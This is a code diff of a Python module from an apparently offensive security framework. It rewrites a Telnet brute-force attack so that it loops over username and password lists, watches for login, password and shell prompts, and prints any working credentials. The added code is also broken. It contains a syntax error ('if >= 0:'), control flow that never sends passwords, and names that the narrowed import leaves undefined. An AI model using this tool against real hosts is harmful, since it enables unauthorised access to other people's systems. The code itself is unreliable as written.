@@ -1,7 +1,7 @@
 import subprocess
 import smf
 
-from apps.utility.colors import *
+from apps.utility.colors import CC
 from lib.roar.calling import call_bin
 
 metadata = {
@@ -32,85 +32,77 @@ REQUIRED_OPTIONS = {
 }
 
 
-def output_stream(line: str) -> str:
-    """
-    Inspects each line of stdout and injects ANSI color codes
-    based on the log pattern (keyword).
-    """
-    if "[ERROR]" in line or "[FATAL]" in line:
-        return f"\n{CC.RED}{line}{CC.RESET}"
-    elif "[INFO]" in line or "[WARNING]" in line:
-        return f"{CC.YELLOW}{line}{CC.RESET}\n"
-    elif "[SUCCESS]" in line:
-        return f"\n{SYM_SUCCESS} {CC.GREEN}{line}{CC.RESET}"
-    elif "[RESULT]" in line:
-        return f"{SYM_FAILED} {CC.CYAN}{line}{CC.RESET}"
-    elif "[SUCC]" in line:
-        return f"\n{CC.GREEN}{line}{CC.RESET}"
-
-    return line  # return line = Standard output
-
-
-def execute(options):
-
-    # Take input
+def execute(options, net):
+    # Ambil parameter dari dictionary
     ip = options.get("IP")
-    thread = options.get("THREAD")
-    user = options.get("USER")
-    passw = options.get("PASS")
+    port = 23
+    user_list = options.get("USER")      # bisa list atau string tunggal
+    pass_list = options.get("PASS")      # bisa list atau string tunggal
 
-    # Binary path
-    bin_path = call_bin("telnet_brute_ak")
+    # Pastikan berbentuk list
+    if isinstance(user_list, str):
+        user_list = [user_list]
+    if isinstance(pass_list, str):
+        pass_list = [pass_list]
 
-    # Binary validation
-    if not bin_path:
-        smf.printf(f"{CC.RED}[!] Binary not found.{CC.RESET}", bin_path)
-        return
-
-    # Enter the required data
-    cmd = [
-        bin_path,
-        "-target",
-        ip,
-        "-threads",
-        thread,
-        "-users",
-        user,
-        "-passwords",
-        passw,
+    # Prompt yang umum ditemui
+    promt_login = ["login:", "Login:"]
+    promt_pass   = ["password:", "pass:", "Password:", "Pass:"]
+    promt_shell  = [
+        "$", "#", ">", "%",
+        "welcome", "last login",
+        "password changed", "press enter"
     ]
 
     smf.printf(f"{CC.CYAN}[*] Starting Telnet Bruteforce => {ip}:23{CC.RESET}\n\n")
 
-    # bufsize=1 (Line buffered) ensures every \n is sent directly to Python's stdout
-    # without waiting for the OS memory buffer to fill up.
-    process = subprocess.Popen(
-        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
-    )
+    success = False
 
-    try:  # Loop of output stream
-        for line in process.stdout:
-            stream_line = output_stream(line)
-            smf.printf(stream_line, end="", flush=True)
-
-    # Monitor CTRL + C
-    except KeyboardInterrupt:
-        smf.printf(f"\n{CC.YELLOW}[*] Proxy stopped.{CC.RESET}")
-
-    # Catch error exception
-    except Exception as e:
-        smf.printf(f"\n{CC.RED}[!] Error =>{CC.RESET}", e)
-        smf.printd(f"Exception Telnet Bruteforce", e, level="ERROR")
-
-    # Stop the binary process
-    finally:
-        if process.poll() is None:  # Check the process in the background
-            process.terminate()
+    for user in user_list:
+        for password in pass_list:
+            con = None
             try:
-                process.wait(timeout=3)
-            except subprocess.TimeoutExpired:
-                process.kill()
+                # Buka koneksi baru
+                con = net.telnet(ip, port)
 
-        smf.printf(
-            f"{CC.GREEN}[*] Telnet brute daemon successfully stopped and cleaned up.{CC.RESET}"
-        )
+                # Tunggu prompt login, kirim username
+                _, res = con.read(expected=promt_login)
+                if res < 0:
+                    smf.printf(f"{CC.YELLOW}[!] Failed to get login prompt for {user}{CC.RESET}")
+                    return # Keluar jika promt tidak di temukan
+
+                # Kirim username, tunggu prompt password
+                _, r = con.send(user, expected=promt_pass)
+                if r < 0:
+                    smf.printf(f"{CC.YELLOW}[*] U:{user} {SYM_FAILED}{CC.RESET}")
+                    break
+
+                if >= 0:
+                    smf.printf(f"{CC.GREEN}[✓] U:{user} {SYM_SUCCESS}{CC.RESET}\n")
+                    continue
+
+                # Kirim password, tunggu prompt shell
+                _, r = con.send(password, expected=promt_shell)
+                if r < 0:
+                    smf.printf(f"{CC.YELLOW}[*] P:{password} {SYM_FAILED}{CC.RESET}")
+                    break
+                
+                if r >= 0:
+                    # Berhasil login!
+                    smf.printf(f"{CC.GREEN}[✓] Bruteforce successful. U={user}:P={password} {SYM_SUCCESS}{CC.RESET}\n")
+                    success = True
+                    return
+
+            except KeyboardInterrupt:
+                smf.printf(f"\n{CC.YELLOW}[*] Proxy stopped by user.{CC.RESET}")
+            except Exception as e:
+                smf.printf(f"\n{CC.RED}[!] Error in the experiment =>{CC.RESET} {user}:{password}")
+                smf.printd("Exception Telnet Bruteforce", e, level="ERROR")
+            finally:
+                if con:
+                    con.close()
+
+    if not success:
+        smf.printf(f"{CC.YELLOW}[!] Bruteforce failed, no valid combination found.{CC.RESET}")
+
+    smf.printf(f"{CC.GREEN}[*] Telnet brute daemon successfully stopped and cleaned up.{CC.RESET}")
